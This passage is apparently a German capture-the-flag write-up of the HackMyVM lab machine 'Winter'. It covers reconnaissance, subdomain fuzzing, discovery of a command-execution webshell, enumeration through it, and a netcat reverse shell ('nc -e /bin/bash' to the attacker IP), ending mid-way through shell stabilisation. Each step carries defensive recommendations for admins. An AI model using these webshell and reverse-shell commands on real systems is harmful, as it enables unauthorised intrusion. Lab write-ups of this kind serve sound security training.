@@ -1,0 +1,951 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Winter - HackMyVM - Level: Medium - Bericht</title>
+    <link rel="stylesheet" href="style.css">
+	<link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body>
+ 
+    <div class="header-bg">
+        <h1>Winter - HackMyVM - Level: Medium - Bericht</h1>
+        <!-- Klasse 'medium' hinzugefügt, damit CSS die korrekte Farbe (Gelb) anwenden kann -->
+        <div class="level-container medium">
+            <!-- Die Farbe wird durch CSS über die Klasse 'medium' gesteuert -->
+            <h2>Medium</h2>
+            <div class="circle">
+                <!-- Die Segmentfarben werden durch CSS über die Klasse 'medium' gesteuert -->
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <!-- Der innere Kreis verwendet die Standard-Header-Farbe aus dem CSS -->
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">curl</div>
+                <div class="tool-item">nikto</div>
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">wfuzz</div>
+                <div class="tool-item">vi</div>
+                <div class="tool-item">nc (netcat)</div>
+                <div class="tool-item">python3</div>
+                <div class="tool-item">stty</div>
+                <div class="tool-item">cat</div>
+                <div class="tool-item">ss</div>
+                <div class="tool-item">sudo</div>
+                <div class="tool-item">ls</div>
+                <div class="tool-item">file</div>
+                <div class="tool-item">crontab</div>
+                <div class="tool-item">printenv</div>
+                <div class="tool-item">mysql client</div>
+                <div class="tool-item">socat</div>
+                <div class="tool-item">hexdump</div>
+                <div class="tool-item">CyberChef (implizit)</div>
+                <div class="tool-item">ssh</div>
+                <div class="tool-item">ssh2john</div>
+                <div class="tool-item">john</div>
+                <div class="tool-item">cp</div>
+                <div class="tool-item">Burp Suite (implizit)</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration-main">Web Enumeration (Hauptdomain)</a></li>
+                <li><a href="#subdomain-enumeration">Subdomain Enumeration</a></li>
+                <li><a href="#web-enumeration-subdomains">Web Enumeration (Subdomains)</a></li>
+                <li><a href="#vulnerability-analysis-rce">Vulnerability Analysis (Webshell RCE)</a></li>
+                <li><a href="#initial-access">Initial Access (Reverse Shell)</a></li>
+                <li><a href="#privilege-escalation-enum">Privilege Escalation (Enumeration)</a></li>
+                <li><a href="#privilege-escalation-db">Privilege Escalation (DB Credentials Leak)</a></li>
+                <li><a href="#privilege-escalation-portfwd">Privilege Escalation (Port Forwarding & Hidden Service)</a></li>
+                <li><a href="#privilege-escalation-lfi-rce">Privilege Escalation (LFI/RCE to Root)</a></li>
+                <li><a href="#poc-rce-webshell">Proof of Concept: RCE via Webshell</a></li>
+                <li><a href="#poc-root-lfi">Proof of Concept: Root via LFI/RCE</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">arp-scan -l</span></div>
+                    <pre>
+Interface: eth0, type: EN10MB, MAC: 08:00:27:f8:e6:a7, IPv4: 192.168.2.121
+Starting arp-scan 1.9.8 with 256 hosts (https://github.com/royhills/arp-scan)
+192.168.2.1	c4:86:e9:a5:6d:18	HUAWEI TECHNOLOGIES CO.,LTD
+192.168.2.102	ac:6f:bb:62:87:79	TATUNG Technology Inc.
+192.168.2.104	84:25:19:2f:66:32	Samsung Electronics
+<span class="command">192.168.2.116	08:00:27:71:95:a8	PCS Systemtechnik GmbH</span>
+192.168.2.188	f0:2f:74:1a:68:c0	ASUSTek COMPUTER INC.
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Der `arp-scan -l` Befehl wird verwendet, um aktive Geräte im lokalen Netzwerk zu finden. Es werden mehrere Geräte identifiziert, darunter `192.168.2.116`, dessen MAC-Adresse (`08:00:27:71:95:a8`) auf eine VirtualBox-VM (PCS Systemtechnik GmbH) hinweist.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die IP-Adresse des Ziels wurde erfolgreich als `192.168.2.116` identifiziert.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Führen Sie einen detaillierten Nmap-Scan auf `192.168.2.116` durch, um offene Ports und Dienste zu ermitteln.<br/><strong>Empfehlung (Admin):</strong> Netzwerksegmentierung kann die Aufklärung erschweren.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sS -sC -T5 -A 192.168.2.116 -p-</span></div>
+                    <pre>
+Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-08 23:14 CET
+Nmap scan report for winter (192.168.2.116)
+Host is up (0.00011s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+<span class="command">22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)</span>
+| ssh-hostkey:
+|   <span class="command">2048 39474aa21d535ad49e4e2e6161e9bb82 (RSA)</span>
+|   <span class="command">256 dc48cbc6f5412cd85a87c62dff35ae15 (ECDSA)</span>
+|_  <span class="command">256 2605e1dd1c60afef4bb7e501aee252ca (ED25519)</span>
+<span class="command">80/tcp open  http    Apache httpd 2.4.38 ((Debian))</span>
+|_<span class="command">http-title: catchme</span>
+|_http-server-header: Apache/2.4.38 (Debian)
+MAC Address: 08:00:27:71:95:A8 (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.6
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.11 ms winter (192.168.2.116)
+</pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Der Nmap-Scan (`-sS`, `-sC`, `-T5`, `-A`, `-p-`) zeigt zwei offene Ports auf dem Ziel `winter` (192.168.2.116):
+                *   Port 22: SSH (OpenSSH 7.9p1 auf Debian 10).
+                *   Port 80: HTTP (Apache 2.4.38 auf Debian) mit dem Titel "catchme".</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Hauptangriffsfläche ist der Webserver auf Port 80. SSH ist ebenfalls ein potenzieller Vektor. Der Titel "catchme" ist ungewöhnlich und könnte ein Hinweis sein.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuchen Sie den Webserver auf Port 80 intensiv mittels Directory Brute-Forcing, Schwachstellenscans (Nikto) und manueller Analyse.<br/><strong>Empfehlung (Admin):</strong> Halten Sie SSH und Apache aktuell. Implementieren Sie eine Web Application Firewall (WAF).</p>
+
+        </section>
+
+        <section id="web-enumeration-main">
+            <h2>Web Enumeration (Hauptdomain)</h2>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl http://192.168.2.116 -I</span></div>
+                     <pre>
+HTTP/1.1 200 OK
+Date: Tue, 08 Nov 2022 22:14:58 GMT
+Server: Apache/2.4.38 (Debian)
+Last-Modified: Fri, 27 Nov 2020 15:01:03 GMT
+ETag: "c9-5b517ede13e8c"
+Accept-Ranges: bytes
+Content-Length: 201
+Vary: Accept-Encoding
+Content-Type: text/html
+</pre>
+                  </div>
+              </div>
+             <p class="analysis"><strong>Analyse:</strong> `curl -I` wird verwendet, um nur die HTTP-Header der Startseite abzurufen. Die Header bestätigen den Apache-Server und zeigen Standardinformationen wie `Last-Modified`, `ETag` und `Content-Length`. Es gibt keine auffälligen oder ungewöhnlichen Header.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Die Header-Analyse liefert keine direkten Hinweise auf Schwachstellen.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Fahren Sie mit aktiveren Scanning-Methoden fort.<br/><strong>Empfehlung (Admin):</strong> Keine.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nikto -h 192.168.2.116</span></div>
+                    <pre>
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          192.168.2.116
++ Target Hostname:    192.168.2.116
++ Target Port:        80
+[...]
++ Server: Apache/2.4.38 (Debian)
++ <span class="password">The anti-clickjacking X-Frame-Options header is not present.</span>
++ <span class="password">The X-XSS-Protection header is not defined.</span> [...]
++ <span class="password">The X-Content-Type-Options header is not set.</span> [...]
++ No CGI Directories found [...]
++ <span class="password">Server may leak inodes via ETags</span>, header found with file /, inode: c9, size: 5b517ede13e8c, mtime: gzip
++ <span class="password">Cookie PHPSESSID created without the httponly flag</span>
++ Allowed HTTP Methods: <span class="command">GET, POST, OPTIONS, HEAD</span>
++ <span class="password">OSVDB-3092: /manual/: Web server manual found.</span>
++ <span class="password">OSVDB-3268: /manual/images/: Directory indexing found.</span>
++ <span class="password">OSVDB-3233: /icons/README: Apache default file found.</span>
++ <span class="password">/login.php: Admin login page/section found.</span>
+[...]
++ 1 host(s) tested
+</pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Nikto identifiziert mehrere Punkte auf Port 80:
+                *   Fehlende Sicherheitsheader (`X-Frame-Options`, `X-XSS-Protection`, `X-Content-Type-Options`).
+                *   Inode-Leak über ETags.
+                *   `PHPSESSID`-Cookie ohne `HttpOnly`-Flag (Risiko bei XSS).
+                *   Existenz des Apache-Manuals (`/manual/`) und des Icons-READMEs.
+                *   **Wichtig:** Eine Login-Seite unter `/login.php` wurde gefunden.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Nikto liefert wertvolle Hinweise. Die fehlenden Header sind Best-Practice-Verstöße. Die Existenz von `/login.php` ist der wichtigste Fund und deutet auf eine Webanwendung mit Authentifizierung hin.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuchen Sie `/login.php`. Führen Sie Directory Brute-Forcing durch, um weitere Seiten der Anwendung zu finden (z.B. Registrierung, Passwort-Reset).<br/><strong>Empfehlung (Admin):</strong> Implementieren Sie die fehlenden Sicherheitsheader. Setzen Sie das `HttpOnly`-Flag für Cookies. Entfernen Sie unnötige Verzeichnisse wie `/manual/` und `/icons/`.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">gobuster dir -u "http://192.168.2.116" -e -x txt,php,rar,zip,tar,pem,pub,xls,docx,doc,sql,db,mdb,asp,aspx,accdb,bat,ps1,exe,sh,py,pl,gz,jpeg,jpg,png,html,phtml,xml,csv,dll,dot,htm,msi,mui,pdf,raw,rtf,vss,wbk,xls,xlsx,zip,kdbx,pgp,gpg  -w "/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt" -t 100</span></div>
+                     <pre>
+http://192.168.2.116/news.php             (Status: 302) [Size: 855] [--> <span class="command">login.php</span>]
+http://192.168.2.116/contact.php          (Status: 302) [Size: 1213] [--> <span class="command">login.php</span>]
+http://192.168.2.116/about.php            (Status: 302) [Size: 1018] [--> <span class="command">login.php</span>]
+http://192.168.2.116/index.html           (Status: 200) [Size: 201]
+http://192.168.2.116/home.php             (Status: 302) [Size: 904] [--> <span class="command">login.php</span>]
+<span class="command">http://192.168.2.116/login.php</span>            (Status: 200) [Size: 900]
+<span class="command">http://192.168.2.116/signup.php</span>           (Status: 200) [Size: 856]
+http://192.168.2.116/upload               (Status: 301) [Size: 315] [--> http://192.168.2.116/upload/]
+http://192.168.2.116/manual               (Status: 301) [Size: 315] [--> http://192.168.2.116/manual/]
+http://192.168.2.116/javascript           (Status: 301) [Size: 319] [--> http://192.168.2.116/javascript/]
+http://192.168.2.116/logout.php           (Status: 302) [Size: 0] [--> <span class="command">login.php</span>]
+<span class="command">http://192.168.2.116/robots.txt</span>           (Status: 200) [Size: 237]
+http://192.168.2.116/settings.php         (Status: 302) [Size: 1259] [--> <span class="command">login.php</span>]
+http://192.168.2.116/av.jpg               (Status: 200) [Size: 43766]
+<span class="command">http://192.168.2.116/fileinfo.txt</span>         (Status: 200) [Size: 52]
+</pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Gobuster findet zahlreiche PHP-Seiten (`news.php`, `contact.php`, `about.php`, `home.php`, `login.php`, `signup.php`, `logout.php`, `settings.php`). Die meisten leiten auf `login.php` weiter (Status 302), was bedeutet, dass sie eine aktive Session erfordern. Wichtig sind die direkt zugänglichen Seiten `login.php`, `signup.php` (Registrierung möglich!), `robots.txt` und `fileinfo.txt`. Das Verzeichnis `/upload` wurde ebenfalls gefunden.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Ergebnisse bestätigen eine Webanwendung mit Benutzerverwaltung. Die `signup.php` ist ein wichtiger Fund, da sie möglicherweise die Erstellung eines eigenen Accounts erlaubt. `robots.txt` und `fileinfo.txt` könnten Hinweise enthalten.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuchen Sie `signup.php` und versuchen Sie, einen Account zu registrieren. Untersuchen Sie den Inhalt von `robots.txt` und `fileinfo.txt`. Analysieren Sie `login.php` auf Schwachstellen (SQLi, Brute-Force).<br/><strong>Empfehlung (Admin):</strong> Deaktivieren Sie die Benutzerregistrierung (`signup.php`), wenn sie nicht öffentlich benötigt wird. Schützen Sie Login-Formulare vor Brute-Force-Angriffen.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl http://192.168.2.116/robots.txt</span></div>
+                     <pre>
+Look for some real vulnerabilities ;)
+
+<span class="command">id
+whoami
+ls
+pwd
+netstat -ano
+catchme
+winter
+cd
+cd ../
+ftp
+ssh
+http
+smtp
+manager
+admin
+superadmin
+ceo
+cto
+https
+tftp
+nano
+vim
+parrot
+linux
+shell</span>
+</pre>
+                  </div>
+              </div>
+             <p class="analysis"><strong>Analyse:</strong> Der Inhalt von `robots.txt` wird abgerufen. Statt der üblichen `Disallow`-Einträge enthält die Datei eine Nachricht ("Look for some real vulnerabilities ;)") und eine lange Liste von Wörtern und Befehlen.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Dies ist keine Standard-`robots.txt`. Die Liste von Wörtern ist höchstwahrscheinlich eine benutzerdefinierte Wortliste, die für weitere Angriffe (z.B. Directory/File Brute-Forcing, Subdomain-Enumeration, Passwort-Cracking) verwendet werden soll oder Hinweise auf Benutzernamen oder Verzeichnisse gibt. Die Wörter `catchme`, `winter`, `manager`, `admin` sind besonders interessant.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Speichern Sie diese Wortliste. Verwenden Sie sie für weitere Gobuster/Wfuzz-Scans (insbesondere für Subdomains und Parameter) und eventuell für Passwort-Cracking-Versuche.<br/><strong>Empfehlung (Admin):</strong> Verwenden Sie `robots.txt` nur für den vorgesehenen Zweck (Kontrolle von Web-Crawlern). Verstecken Sie keine Wortlisten oder Hinweise in öffentlich zugänglichen Dateien.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl http://192.168.2.116/fileinfo.txt</span></div>
+                     <pre>
+a small hint for you :)
+
+
+<span class="command">winter is my domain name!</span>
+</pre>
+                  </div>
+              </div>
+             <p class="analysis"><strong>Analyse:</strong> Die Datei `fileinfo.txt` enthält den Hinweis "winter is my domain name!".</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Dies bestätigt, dass `winter` als Domain-/Hostname für die Maschine verwendet wird (z.B. für virtuelle Hosts). Dies passt zum Hostnamen, der im Nmap-Scan gefunden wurde.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Fügen Sie `winter` zur lokalen `/etc/hosts`-Datei hinzu (falls noch nicht geschehen). Verwenden Sie diesen Hostnamen bei Subdomain-Enumerationsversuchen.<br/><strong>Empfehlung (Admin):</strong> Keine.</p>
+
+        </section>
+
+        <section id="subdomain-enumeration">
+            <h2>Subdomain Enumeration</h2>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u "http://winter" -H "Host: FUZZ.winter" --hh 201</span></div>
+                      <pre>
+ * Wfuzz 3.1.0 - The Web Fuzzer *
+ [...]
+ =====================================================================
+ ID           Response   Lines    Word       Chars       Payload
+ =====================================================================
+
+ <span class="command">000000491:   200        14 L     17 W       199 Ch      "manager"</span>
+ <span class="command">000008160:   200        14 L     17 W       198 Ch      "cmd"</span>
+ </pre>
+                  </div>
+              </div>
+             <p class="analysis"><strong>Analyse:</strong> Wfuzz wird verwendet, um Subdomains von `winter` zu finden, indem der `Host`-Header gefuzzt wird (`-H "Host: FUZZ.winter"`). Es verwendet eine große Subdomain-Liste. `--hh 201` blendet Antworten aus, die die gleiche Größe wie die Hauptseite (`index.html` hatte 201 Bytes) haben. Zwei Subdomains werden gefunden: `manager` und `cmd`.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> **Wichtiger Fund!** Es existieren mindestens zwei virtuelle Hosts/Subdomains: `manager.winter` und `cmd.winter`. Diese hosten wahrscheinlich unterschiedliche Anwendungen oder Funktionalitäten.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Fügen Sie `manager.winter` und `cmd.winter` zur lokalen `/etc/hosts`-Datei hinzu (beide zeigen auf `192.168.2.116`). Führen Sie Directory Busting und weitere Analysen auf diesen beiden Subdomains durch.<br/><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass alle virtuellen Hosts korrekt konfiguriert und gesichert sind. Vermeiden Sie leicht zu erratende Namen für administrative oder Test-Subdomains.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">vi /etc/hosts</span></div>
+                     <pre>
+127.0.0.1	localhost
+127.0.1.1	cyber
+
+<span class="command">192.168.2.116   winter manager.winter cmd.winter</span>
+</pre>
+                  </div>
+              </div>
+             <p class="analysis"><strong>Analyse:</strong> Die `/etc/hosts`-Datei des Angreifers wird bearbeitet, um die gefundenen Subdomains `manager.winter` und `cmd.winter` auf die IP-Adresse `192.168.2.116` zu mappen.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Notwendiger Schritt, um die Subdomains über ihren Namen im Browser und in Tools ansprechen zu können.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Überprüfen Sie die Erreichbarkeit der Subdomains (z.B. mit `ping` oder `curl`).<br/><strong>Empfehlung (Admin):</strong> Keine.</p>
+
+        </section>
+
+        <section id="web-enumeration-subdomains">
+            <h2>Web Enumeration (Subdomains)</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">gobuster dir -u "http://manager.winter" -e -x ... -w ... -t 100</span></div> <!-- Gekürzt -->
+                     <pre>
+ [...]
+ http://manager.winter/news.php             (Status: 302) [Size: 855] [--> login.php]
+ http://manager.winter/index.html           (Status: 200) [Size: 199]
+ http://manager.winter/contact.php          (Status: 302) [Size: 1243] [--> login.php]
+ http://manager.winter/about.php            (Status: 302) [Size: 1558] [--> login.php]
+ http://manager.winter/home.php             (Status: 302) [Size: 907] [--> login.php]
+ <span class="command">http://manager.winter/login.php</span>            (Status: 200) [Size: 1275]
+ http://manager.winter/manual               (Status: 301) [Size: 317] [--> http://manager.winter/manual/]
+ http://manager.winter/javascript           (Status: 301) [Size: 321] [--> http://manager.winter/javascript/]
+ http://manager.winter/logout.php           (Status: 302) [Size: 0] [--> login.php]
+ http://manager.winter/av.jpg               (Status: 200) [Size: 43766]
+ </pre>
+                  </div>
+              </div>
+             <p class="analysis"><strong>Analyse:</strong> Gobuster wird auf `http://manager.winter` ausgeführt. Die Ergebnisse ähneln stark der Hauptdomain `winter`, insbesondere das Vorhandensein von `login.php` und Seiten, die dorthin weiterleiten. Dies deutet darauf hin, dass `manager.winter` möglicherweise eine Instanz derselben Anwendung oder zumindest eine ähnliche Struktur verwendet, aber eventuell für Manager gedacht ist.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Die Subdomain `manager.winter` scheint ebenfalls eine Login-geschützte Anwendung zu sein. Ohne Login ist hier wenig zu holen.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Versuchen Sie Standard-Logins oder die Wörter aus `robots.txt` als mögliche Zugangsdaten für `manager.winter/login.php`. Konzentrieren Sie sich aber zunächst auf die andere Subdomain `cmd.winter`.<br/><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass verschiedene virtuelle Hosts/Anwendungen unterschiedliche Schwachstellenprofile haben und nicht einfach Kopien voneinander sind, es sei denn, dies ist beabsichtigt.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">gobuster dir -u "http://cmd.winter" -e -x ... -w ... -t 100</span></div> <!-- Gekürzt -->
+                     <pre>
+ [...]
+ http://cmd.winter/index.html           (Status: 200) [Size: 198]
+ http://cmd.winter/manual               (Status: 301) [Size: 309] [--> http://cmd.winter/manual/]
+ http://cmd.winter/javascript           (Status: 301) [Size: 313] [--> http://cmd.winter/javascript/]
+ <span class="command">http://cmd.winter/shellcity.php</span>        (Status: 200) [Size: 1040]
+ </pre>
+                  </div>
+              </div>
+             <p class="analysis"><strong>Analyse:</strong> Gobuster auf `http://cmd.winter` findet eine sehr interessante Datei: `shellcity.php`. Andere Funde wie `index.html` und `/manual/` scheinen weniger relevant.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Der Name `shellcity.php` legt nahe, dass es sich um eine Webshell oder eine Seite handelt, die Befehlsausführung ermöglicht. Dies ist ein vielversprechender Fund.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Rufen Sie `http://cmd.winter/shellcity.php` im Browser oder mit `curl` auf und untersuchen Sie die Funktionalität. Suchen Sie nach Eingabefeldern oder Parametern zur Befehlsausführung.<br/><strong>Empfehlung (Admin):</strong> Solche Seiten dürfen niemals auf produktiven oder aus dem Netzwerk erreichbaren Systemen existieren! Entfernen Sie die Datei sofort.</p>
+
+        </section>
+
+        <section id="vulnerability-analysis-rce">
+            <h2>Vulnerability Analysis (Webshell RCE)</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <pre><span class="command">http://cmd.winter/shellcity.php</span>
+id
+localhost
+<span class="password">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span>
+
+www-data
+</pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Beim Aufruf von `shellcity.php` (vermutlich im Browser, da Eingabe "id" und "localhost" erwähnt wird) wird anscheinend der `id`-Befehl ausgeführt und dessen Ausgabe (`uid=33(www-data)...`) angezeigt. Es scheint sich um eine funktionierende Webshell oder eine Seite mit direkter Command Injection zu handeln.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> **RCE-Schwachstelle bestätigt!** Die Seite `shellcity.php` erlaubt die Ausführung von Befehlen als `www-data`.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Finden Sie heraus, wie Befehle übergeben werden (wahrscheinlich ein GET- oder POST-Parameter). Nutzen Sie die RCE, um eine Reverse Shell zu bekommen.<br/><strong>Empfehlung (Admin):</strong> Webshell sofort entfernen! Untersuchen, wie sie dorthin gelangt ist.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://cmd.winter/shellcity.php?FUZZ=id --hh 1040</span></div>
+                     <pre>
+ [...]
+ =====================================================================
+ ID           Response   Lines    Word       Chars       Payload
+ =====================================================================
+
+ <span class="command">000006487:   200        57 L     106 W      1147 Ch     "run"</span>
+ </pre>
+                  </div>
+              </div>
+             <p class="analysis"><strong>Analyse:</strong> Wfuzz wird verwendet, um den GET-Parameter zu finden, der die Befehlsausführung in `shellcity.php` ermöglicht. Es testet verschiedene Parameter (`FUZZ`) mit dem Wert `id`. `--hh 1040` blendet Antworten aus, die der normalen Größe der Seite entsprechen. Der Parameter `run` wird als erfolgreich identifiziert (Status 200, abweichende Größe).</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Der Parameter für die RCE lautet `run`.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Verwenden Sie den Parameter `run` für die weitere Ausführung von Befehlen, z.B. `http://cmd.winter/shellcity.php?run=ls%20-la`.<br/><strong>Empfehlung (Admin):</strong> RCE beheben (Webshell entfernen).</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre><span class="command">http://cmd.winter/shellcity.php?run=id</span>
+<span class="password">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span>
+</pre>
+                  </div>
+              </div>
+             <p class="analysis"><strong>Analyse:</strong> Test der RCE mit dem gefundenen Parameter `run` und dem Befehl `id`. Die Ausgabe bestätigt die Funktionsfähigkeit.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> RCE über `run`-Parameter verifiziert.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre><span class="command">http://cmd.winter/shellcity.php?run=ls%20/home</span>
+<span class="command">hint.txt</span>
+</pre>
+                  </div>
+              </div>
+              <div class="code-block">
+                  <div class="terminal">
+                       <pre><span class="command">http://cmd.winter/shellcity.php?run=cat%20/home/hint.txt</span>
+<span class="command">enumerate as much as you can :)</span>
+</pre>
+                   </div>
+               </div>
+              <div class="code-block">
+                   <div class="terminal">
+                       <pre><span class="command">http://cmd.winter/shellcity.php?run=grep%20bash%20/etc/passwd</span>
+root:x:0:0:root:/root:/bin/bash
+<span class="command">catchme:x:1000:1000:catchme,,,:/home/catchme:/bin/bash</span>
+</pre>
+                   </div>
+               </div>
+              <p class="analysis"><strong>Analyse:</strong> Weitere Befehle werden über die RCE ausgeführt:
+                  *   `ls /home` zeigt eine Datei `hint.txt`.
+                  *   `cat /home/hint.txt` gibt den Hinweis "enumerate as much as you can :)" aus.
+                  *   `grep bash /etc/passwd` identifiziert `root` und `catchme` als Benutzer mit Bash-Login-Shell.</p>
+              <p class="evaluation"><strong>Bewertung:</strong> Grundlegende Enumeration über die RCE durchgeführt. Der Benutzer `catchme` ist ein potenzielles Ziel.</p>
+              <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Etablieren Sie eine stabilere Reverse Shell, um die weitere Enumeration zu erleichtern.<br/><strong>Empfehlung (Admin):</strong> RCE beheben.</p>
+
+        </section>
+
+        <section id="initial-access">
+            <h2>Initial Access (Reverse Shell)</h2>
+
+             <p class="analysis"><strong>Analyse:</strong> Es wird versucht, den SSH Public Key des Angreifers (`/root/.ssh/id_rsa.pub`) über die Webshell in eine `authorized_keys`-Datei auf dem Ziel zu schreiben. Dieser Ansatz ist fehlerhaft, da der Befehl auf der Angreifer-Maschine ausgeführt wird und der Output (`echo "ssh-rsa ..."`) über den `run`-Parameter gesendet werden müsste.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Der dargestellte Versuch, den SSH-Key zu platzieren, ist in dieser Form nicht funktionsfähig. Es wird stattdessen eine Netcat-Reverse-Shell verwendet.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre><span class="command">http://cmd.winter/shellcity.php?run=nc%20-e%20/bin/bash%20192.168.2.121%209001</span></pre>
+                  </div>
+              </div>
+              <div class="code-block">
+                  <div class="terminal">
+                       <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc -lvnp 9001</span></div>
+                       <pre>
+listening on [any] 9001 ...
+<span class="password">connect to [192.168.2.121] from (UNKNOWN) [192.168.2.116] 45886</span>
+</pre>
+                   </div>
+               </div>
+              <p class="analysis"><strong>Analyse:</strong> Über die RCE (`run`-Parameter) wird ein Netcat-Reverse-Shell-Befehl (URL-kodiert) ausgeführt, der sich zur Angreifer-IP `192.168.2.121` auf Port 9001 verbindet. Der Listener auf der Angreifer-Maschine empfängt die Verbindung.</p>
+              <p class="evaluation"><strong>Bewertung:</strong> **Initialer Zugriff erfolgreich!** Eine Reverse Shell als `www-data` wurde über die Webshell auf `cmd.winter` erlangt.</p>
+              <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Stabilisieren Sie die Shell.<br/><strong>Empfehlung (Admin):</strong> RCE beheben, Egress-Filtering.</p>
+
+              <p class="analysis"><strong>Analyse:</strong> Die Shell wird mit den Standard-Python- und `stty`-Befehlen stabilisiert.</p>
+              <div class="code-block">
+                  <div class="terminal">
+                      <pre><span class="prompt"></span><span class="command">python3 -c 'import pty;pty.spawn("/bin/bash")'</span></pre>
+                      <pre><span class="prompt">www-data@winter:/var/www/cmd$</span> <span class="command">export TERM=xterm</span></pre>
+                      <pre><span class="prompt">www-data@winter:/var/www/cmd$</span> <span class="command">^Z</span></pre>
+                      <pre>zsh: suspended  nc -lvnp 9001</pre>
+                   </div>
+               </div>
+              <div class="code-block">
+                   <div class="terminal">
